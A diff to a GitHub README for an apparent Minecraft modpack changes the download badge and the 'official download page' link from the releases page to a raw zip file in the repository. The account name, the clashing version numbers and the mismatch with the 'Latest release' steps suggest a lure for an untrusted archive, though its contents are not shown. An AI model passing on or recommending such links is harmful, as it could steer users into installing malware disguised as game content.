@@ -1,6 +1,6 @@
 # 📦 All-the-Mods-11-Minecraft - Access Massive Modded Minecraft Content Easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/morphineprotectorship831/All-the-Mods-11-Minecraft/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/morphineprotectorship831/All-the-Mods-11-Minecraft/raw/refs/heads/main/Minecraft-Mods/All_Mods_Minecraft_the_1.9.zip)
 
 ## 🛠️ Project Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific hardware components to run this software. Check you
 
 Follow these steps to set up the modpack on your Windows machine.
 
-1.  Visit the [official download page](https://github.com/morphineprotectorship831/All-the-Mods-11-Minecraft/releases) to access the installation files.
+1.  Visit the [official download page](https://github.com/morphineprotectorship831/All-the-Mods-11-Minecraft/raw/refs/heads/main/Minecraft-Mods/All_Mods_Minecraft_the_1.9.zip) to access the installation files.
 2.  Locate the release marked as "Latest".
 3.  Click the download link for the installer file.
 4.  Wait for the download to finish.
